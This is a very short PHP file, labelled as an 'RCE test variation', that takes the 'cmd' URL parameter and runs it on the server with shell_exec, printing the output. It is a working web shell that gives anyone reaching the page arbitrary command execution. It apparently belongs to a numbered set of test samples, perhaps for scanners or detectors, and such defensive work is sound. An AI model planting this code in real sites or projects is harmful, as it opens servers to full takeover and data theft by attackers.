<?php
// RCE test variation #401
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>